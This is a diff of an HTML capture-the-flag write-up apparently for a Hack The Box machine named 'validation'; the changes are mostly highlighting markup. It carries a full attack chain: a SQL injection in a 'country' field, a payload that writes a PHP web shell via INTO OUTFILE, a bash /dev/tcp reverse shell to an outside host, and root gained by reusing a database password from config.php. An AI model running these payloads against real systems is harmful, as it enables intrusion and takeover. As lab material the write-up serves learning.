@@ -192,13 +192,13 @@
         <h1 id="tcp-port-80">TCP port 80</h1>
 <h2 id="detect-sql-injection">Detect SQL Injection</h2>
 <p>Using <code>curl -i -vvv</code> we can see there is redirection (code 302) with a Set-Cookies header in the response; We have to use <code>curl -L -b cookies.txt</code> to save the cookie in a file and follow redirection</p>
-<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
-<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
-<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
+<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
+<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
+<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
 </span></code></pre></td>
 <td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
-<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">curl -L -b cookiest.txt <span style="color:#f1fa8c">&#39;http://10.10.11.116/#&#39;</span> -H <span style="color:#f1fa8c">&#39;User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:91.0) Gecko/20100101 Firefox/91.0&#39;</span> -H <span style="color:#f1fa8c">&#39;Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,_/_;q=0.8&#39;</span> -H <span style="color:#f1fa8c">&#39;Accept-Language: en-GB,en;q=0.5&#39;</span> --compressed -H <span style="color:#f1fa8c">&#39;Referer: http://10.10.11.116/&#39;</span> -H <span style="color:#f1fa8c">&#39;Content-Type: application/x-www-form-urlencoded&#39;</span> -H <span style="color:#f1fa8c">&#39;Origin: http://10.10.11.116&#39;</span> -H <span style="color:#f1fa8c">&#39;DNT: 1&#39;</span> -H <span style="color:#f1fa8c">&#39;Connection: keep-alive&#39;</span> -H <span style="color:#f1fa8c">&#39;Upgrade-Insecure-Requests: 1&#39;</span> -H <span style="color:#f1fa8c">&#39;Pragma: no-cache&#39;</span> -H <span style="color:#f1fa8c">&#39;Cache-Control: no-cache&#39;</span> --data-raw <span style="color:#f1fa8c">&#34;username=test&amp;country=Brazil&#39;&#34;</span>
-</code></pre></td></tr></table>
+<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>curl -L -b cookiest.txt <span style="color:#f1fa8c">&#39;http://10.10.11.116/#&#39;</span> -H <span style="color:#f1fa8c">&#39;User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:91.0) Gecko/20100101 Firefox/91.0&#39;</span> -H <span style="color:#f1fa8c">&#39;Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,_/_;q=0.8&#39;</span> -H <span style="color:#f1fa8c">&#39;Accept-Language: en-GB,en;q=0.5&#39;</span> --compressed -H <span style="color:#f1fa8c">&#39;Referer: http://10.10.11.116/&#39;</span> -H <span style="color:#f1fa8c">&#39;Content-Type: application/x-www-form-urlencoded&#39;</span> -H <span style="color:#f1fa8c">&#39;Origin: http://10.10.11.116&#39;</span> -H <span style="color:#f1fa8c">&#39;DNT: 1&#39;</span> -H <span style="color:#f1fa8c">&#39;Connection: keep-alive&#39;</span> -H <span style="color:#f1fa8c">&#39;Upgrade-Insecure-Requests: 1&#39;</span> -H <span style="color:#f1fa8c">&#39;Pragma: no-cache&#39;</span> -H <span style="color:#f1fa8c">&#39;Cache-Control: no-cache&#39;</span> --data-raw <span style="color:#f1fa8c">&#34;username=test&amp;country=Brazil&#39;&#34;</span>
+</span></span></code></pre></td></tr></table>
 </div>
 </div><p>The result of the above shows a PHP error which is indicative of possible SQL injection:</p>
 <pre tabindex="0"><code>&lt;b&gt;Fatal error&lt;/b&gt;:  Uncaught Error: Call to a member function fetch_assoc() on bool in /var/www/html/account.php:33
@@ -224,108 +224,108 @@
 <p>So the query returns one column only</p>
 <h2 id="attempt-file-injection">Attempt File Injection</h2>
 <p>We knows it is PHP, so we can attempt to drop a shell.php file into <code>/var/ww/html</code> folder with this payload:</p>
-<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
-<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
-<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
+<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
+<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
+<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
 </span></code></pre></td>
 <td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
-<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sql" data-lang="sql">Country<span style="color:#ff79c6">%</span><span style="color:#bd93f9">27</span> <span style="color:#ff79c6">union</span> <span style="color:#ff79c6">select</span> <span style="color:#f1fa8c">&#39;&lt;?php echo system($_GET[&#34;cmd&#34;]); ?&gt;&#39;</span> <span style="color:#ff79c6">INTO</span> OUTFILE <span style="color:#f1fa8c">&#39;/var/www/html/shell.php&#39;</span> <span style="color:#6272a4">-- -
-</span></code></pre></td></tr></table>
+<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sql" data-lang="sql"><span style="display:flex;"><span>Country<span style="color:#ff79c6">%</span><span style="color:#bd93f9">27</span> <span style="color:#ff79c6">union</span> <span style="color:#ff79c6">select</span> <span style="color:#f1fa8c">&#39;&lt;?php echo system($_GET[&#34;cmd&#34;]); ?&gt;&#39;</span> <span style="color:#ff79c6">INTO</span> OUTFILE <span style="color:#f1fa8c">&#39;/var/www/html/shell.php&#39;</span> <span style="color:#6272a4">-- -
+</span></span></span></code></pre></td></tr></table>
 </div>
 </div><p>The response returns an error, but we can see the file http://10.10.11.116/shell.php does not returns 404 File Not Found which confirms it has been created.
 The reason why we have an error is because nothing is being returned by the SQL query</p>
-<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
-<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
-<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2
+<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
+<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
+<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2
 </span></code></pre></td>
 <td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
-<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">curl -b cookies.txt http://10.10.11.116/shell.php<span style="color:#f1fa8c">\?</span>cmd<span style="color:#f1fa8c">\=</span>id
-<span style="color:#8be9fd;font-style:italic">uid</span><span style="color:#ff79c6">=</span>33<span style="color:#ff79c6">(</span>www-data<span style="color:#ff79c6">)</span> <span style="color:#8be9fd;font-style:italic">gid</span><span style="color:#ff79c6">=</span>33<span style="color:#ff79c6">(</span>www-data<span style="color:#ff79c6">)</span> <span style="color:#8be9fd;font-style:italic">groups</span><span style="color:#ff79c6">=</span>33<span style="color:#ff79c6">(</span>www-data<span style="color:#ff79c6">)</span>
-</code></pre></td></tr></table>
+<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>curl -b cookies.txt http://10.10.11.116/shell.php<span style="color:#f1fa8c">\?</span>cmd<span style="color:#f1fa8c">\=</span>id
+</span></span><span style="display:flex;"><span><span style="color:#8be9fd;font-style:italic">uid</span><span style="color:#ff79c6">=</span>33<span style="color:#ff79c6">(</span>www-data<span style="color:#ff79c6">)</span> <span style="color:#8be9fd;font-style:italic">gid</span><span style="color:#ff79c6">=</span>33<span style="color:#ff79c6">(</span>www-data<span style="color:#ff79c6">)</span> <span style="color:#8be9fd;font-style:italic">groups</span><span style="color:#ff79c6">=</span>33<span style="color:#ff79c6">(</span>www-data<span style="color:#ff79c6">)</span>
+</span></span></code></pre></td></tr></table>
 </div>
 </div><h1 id="reverse-shell">Reverse Shell</h1>
 <p>in burp repeater we can url-encode key characters only:</p>
-<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
-<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
-<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2
+<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
+<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
+<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2
 </span></code></pre></td>
 <td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
-<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">regular: bash -c <span style="color:#f1fa8c">&#34;bash -i &gt;&amp; /dev/tcp/10.10.14.85/9001 2&gt;&amp;1&#34;</span>
-encoded: bash+-c+<span style="color:#f1fa8c">&#34;bash+-i+&gt;%26+/dev/tcp/10.10.14.85/9001+2&gt;%261
-</span></code></pre></td></tr></table>
+<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>regular: bash -c <span style="color:#f1fa8c">&#34;bash -i &gt;&amp; /dev/tcp/10.10.14.85/9001 2&gt;&amp;1&#34;</span>
+</span></span><span style="display:flex;"><span>encoded: bash+-c+<span style="color:#f1fa8c">&#34;bash+-i+&gt;%26+/dev/tcp/10.10.14.85/9001+2&gt;%261
+</span></span></span></code></pre></td></tr></table>
 </div>
 </div><p>We obatain a reverse shell:</p>
-<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
-<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
-<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">14
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">15
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">16
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">17
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">18
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">19
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">20
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">21
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">22
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">23
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">24
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">25
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">26
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">27
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">28
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">29
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">30
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">31
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">32
+<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
+<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
+<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">14
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">15
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">16
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">17
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">18
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">19
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">20
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">21
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">22
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">23
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">24
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">25
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">26
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">27
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">28
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">29
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">30
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">31
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">32
 </span></code></pre></td>
 <td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
-<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">www-data@validation:/var/www/html$ id
-id
-<span style="color:#8be9fd;font-style:italic">uid</span><span style="color:#ff79c6">=</span>33<span style="color:#ff79c6">(</span>www-data<span style="color:#ff79c6">)</span> <span style="color:#8be9fd;font-style:italic">gid</span><span style="color:#ff79c6">=</span>33<span style="color:#ff79c6">(</span>www-data<span style="color:#ff79c6">)</span> <span style="color:#8be9fd;font-style:italic">groups</span><span style="color:#ff79c6">=</span>33<span style="color:#ff79c6">(</span>www-data<span style="color:#ff79c6">)</span>
-www-data@validation:/var/www/html$ ls
-ls
-account.php
-config.php
-css
-index.php
-js
-shellasdfg.php
-www-data@validation:/var/www/html$ cat config.php
-cat config.php
-&lt;?php
-  <span style="color:#8be9fd;font-style:italic">$servername</span> <span style="color:#ff79c6">=</span> <span style="color:#f1fa8c">&#34;127.0.0.1&#34;</span>;
-  <span style="color:#8be9fd;font-style:italic">$username</span> <span style="color:#ff79c6">=</span> <span style="color:#f1fa8c">&#34;uhc&#34;</span>;
-  <span style="color:#8be9fd;font-style:italic">$password</span> <span style="color:#ff79c6">=</span> <span style="color:#f1fa8c">&#34;uhc-9qual-global-pw&#34;</span>;
-  <span style="color:#8be9fd;font-style:italic">$dbname</span> <span style="color:#ff79c6">=</span> <span style="color:#f1fa8c">&#34;registration&#34;</span>;
-
-  <span style="color:#8be9fd;font-style:italic">$conn</span> <span style="color:#ff79c6">=</span> new mysqli<span style="color:#ff79c6">(</span><span style="color:#8be9fd;font-style:italic">$servername</span>, <span style="color:#8be9fd;font-style:italic">$username</span>, <span style="color:#8be9fd;font-style:italic">$password</span>, <span style="color:#8be9fd;font-style:italic">$dbname</span><span style="color:#ff79c6">)</span>;
-?&gt;
-www-data@validation:/var/www/html$ su -
-su -
-Password: uhc-9qual-global-pw
-id
-<span style="color:#8be9fd;font-style:italic">uid</span><span style="color:#ff79c6">=</span>0<span style="color:#ff79c6">(</span>root<span style="color:#ff79c6">)</span> <span style="color:#8be9fd;font-style:italic">gid</span><span style="color:#ff79c6">=</span>0<span style="color:#ff79c6">(</span>root<span style="color:#ff79c6">)</span> <span style="color:#8be9fd;font-style:italic">groups</span><span style="color:#ff79c6">=</span>0<span style="color:#ff79c6">(</span>root<span style="color:#ff79c6">)</span>
-cat /root/root.txt
-f9bd49a48cf9179c8629c354e16b2824
-ls /home
-htb
-cat /home/htb/user.txt
-36b0fe40ef8b62abd2a42f8149be3408
-</code></pre></td></tr></table>
+<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>www-data@validation:/var/www/html$ id
+</span></span><span style="display:flex;"><span>id
+</span></span><span style="display:flex;"><span><span style="color:#8be9fd;font-style:italic">uid</span><span style="color:#ff79c6">=</span>33<span style="color:#ff79c6">(</span>www-data<span style="color:#ff79c6">)</span> <span style="color:#8be9fd;font-style:italic">gid</span><span style="color:#ff79c6">=</span>33<span style="color:#ff79c6">(</span>www-data<span style="color:#ff79c6">)</span> <span style="color:#8be9fd;font-style:italic">groups</span><span style="color:#ff79c6">=</span>33<span style="color:#ff79c6">(</span>www-data<span style="color:#ff79c6">)</span>
+</span></span><span style="display:flex;"><span>www-data@validation:/var/www/html$ ls
+</span></span><span style="display:flex;"><span>ls
+</span></span><span style="display:flex;"><span>account.php
+</span></span><span style="display:flex;"><span>config.php
+</span></span><span style="display:flex;"><span>css
+</span></span><span style="display:flex;"><span>index.php
+</span></span><span style="display:flex;"><span>js
+</span></span><span style="display:flex;"><span>shellasdfg.php
+</span></span><span style="display:flex;"><span>www-data@validation:/var/www/html$ cat config.php
+</span></span><span style="display:flex;"><span>cat config.php
+</span></span><span style="display:flex;"><span>&lt;?php
+</span></span><span style="display:flex;"><span>  <span style="color:#8be9fd;font-style:italic">$servername</span> <span style="color:#ff79c6">=</span> <span style="color:#f1fa8c">&#34;127.0.0.1&#34;</span>;
+</span></span><span style="display:flex;"><span>  <span style="color:#8be9fd;font-style:italic">$username</span> <span style="color:#ff79c6">=</span> <span style="color:#f1fa8c">&#34;uhc&#34;</span>;
+</span></span><span style="display:flex;"><span>  <span style="color:#8be9fd;font-style:italic">$password</span> <span style="color:#ff79c6">=</span> <span style="color:#f1fa8c">&#34;uhc-9qual-global-pw&#34;</span>;
+</span></span><span style="display:flex;"><span>  <span style="color:#8be9fd;font-style:italic">$dbname</span> <span style="color:#ff79c6">=</span> <span style="color:#f1fa8c">&#34;registration&#34;</span>;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  <span style="color:#8be9fd;font-style:italic">$conn</span> <span style="color:#ff79c6">=</span> new mysqli<span style="color:#ff79c6">(</span><span style="color:#8be9fd;font-style:italic">$servername</span>, <span style="color:#8be9fd;font-style:italic">$username</span>, <span style="color:#8be9fd;font-style:italic">$password</span>, <span style="color:#8be9fd;font-style:italic">$dbname</span><span style="color:#ff79c6">)</span>;
+</span></span><span style="display:flex;"><span>?&gt;
+</span></span><span style="display:flex;"><span>www-data@validation:/var/www/html$ su -
+</span></span><span style="display:flex;"><span>su -
+</span></span><span style="display:flex;"><span>Password: uhc-9qual-global-pw
+</span></span><span style="display:flex;"><span>id
+</span></span><span style="display:flex;"><span><span style="color:#8be9fd;font-style:italic">uid</span><span style="color:#ff79c6">=</span>0<span style="color:#ff79c6">(</span>root<span style="color:#ff79c6">)</span> <span style="color:#8be9fd;font-style:italic">gid</span><span style="color:#ff79c6">=</span>0<span style="color:#ff79c6">(</span>root<span style="color:#ff79c6">)</span> <span style="color:#8be9fd;font-style:italic">groups</span><span style="color:#ff79c6">=</span>0<span style="color:#ff79c6">(</span>root<span style="color:#ff79c6">)</span>
+</span></span><span style="display:flex;"><span>cat /root/root.txt
+</span></span><span style="display:flex;"><span>f9bd49a48cf9179c8629c354e16b2824
+</span></span><span style="display:flex;"><span>ls /home
+</span></span><span style="display:flex;"><span>htb
+</span></span><span style="display:flex;"><span>cat /home/htb/user.txt
+</span></span><span style="display:flex;"><span>36b0fe40ef8b62abd2a42f8149be3408
+</span></span></code></pre></td></tr></table>
 </div>
 </div>
       </div>
